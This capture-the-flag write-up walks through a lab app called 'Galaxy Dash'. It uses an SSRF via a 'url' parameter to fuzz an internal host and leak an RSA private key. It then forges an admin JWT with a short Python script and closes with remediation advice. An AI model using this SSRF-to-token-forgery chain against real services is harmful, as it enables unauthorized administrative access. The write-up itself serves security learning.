---
platform: BugForge
difficulty: Medium
vulnerability: JWT Manipulation
date: 2026-02-02
---
---
# [WRITEUP] Galaxy Dash: From SSRF to JWT manipulation

## 1. Reconnaissance 
The entry point was a feature in the "Galaxy Dash" application that tracked shipping status. By capturing the request in Burp Suite, I identified a `POST` request to `/api/data`.

The payload contained a JSON object with a `url` parameter pointing to an internal domain:

```
POST /api/data HTTP/1.1
...
Content-Type: application/json

{"url":"services.internal-galaxydash-systems.io/shipping"}
```

**The Researcher's Instinct:**
- Whenever an application takes a URL as input and fetches data from it on the backend, **SSRF** is the primary suspect. The hint _"Can you find and use something that is supposed to be secret?"_ suggested that we needed to use this SSRF to pivot into an internal service that holds sensitive data.

## 2. Enumeration 

I attempted to hit standard internal endpoints (`/admin`, `/flag`, `127.0.0.1`) by modifying the `url` parameter, but got no results.

I switched to automated fuzzing using `ffuf` to enumerate the internal `services.internal-galaxydash-systems.io` domain.

**Command:**

```
ffuf -request req.txt -w /usr/share/wordlists/dirb/common.txt
```

**Findings:**

`ffuf` returned a `200 OK` (but different content) for the `/auth` directory. I then recursively fuzzed inside `/auth` and discovered two critical endpoints:
![[Screenshot (51).png]]

- `/auth/public`
- `/auth/private`

![[Screenshot (54).png]]
Sending the request to `services.internal-galaxydash-systems.io/auth/private` via the SSRF vulnerability leaked the **RSA Private Key** used to sign the application's JWTs.
![[Screenshot (56).png]]
## 3. Exploitation

With the private key in hand, the path to Admin access was clear. The application uses `RS256` (Asymmetric signing). Since I possess the private key, I can sign my own tokens that the server will accept as valid.

With a quick Python script to generate a forged Admin token:

```
import jwt
import time

private_key = """RSA-PRIVATE-KEY-GOES-HERE"""

payload = {
    "id": 1,
    "username": "admin",
    "organizationId": 1,
    "role": "admin",
    "iat": int(time.time())
}

token = jwt.encode(payload, private_key, algorithm="RS256")
print(f"[+] Forged Admin Token: {token}")
```

## 4. Execution & Loot

1. Generated the forged JWT.
2. Opened Chrome DevTools -> Application -> Local Storage.
3. Replaced the existing `access_token` with the forged Admin token.
4. Refreshed the page.

The application accepted the token. The flag was returned in a custom response header:

```
HTTP/2 200 OK
X-Galaxy-Flag: flag_will_be_found_here
```

---

## 5. Defense & Remediation (The Blue Team View)

1. **SSRF Prevention:** The application trusted user input (`url` parameter) to make backend network calls.
    - _Fix:_ Implement a strict `Allowlist` of permitted domains. Do not allow the user to supply the full path or domain.

2. **Secret Management:** The RSA Private Key was exposed on an internal web endpoint (`/auth/private`).
    - _Fix:_ Private keys should never be served over HTTP, even internally. They should be stored in a secure vault and accessed via environment variables, not web routes.


---
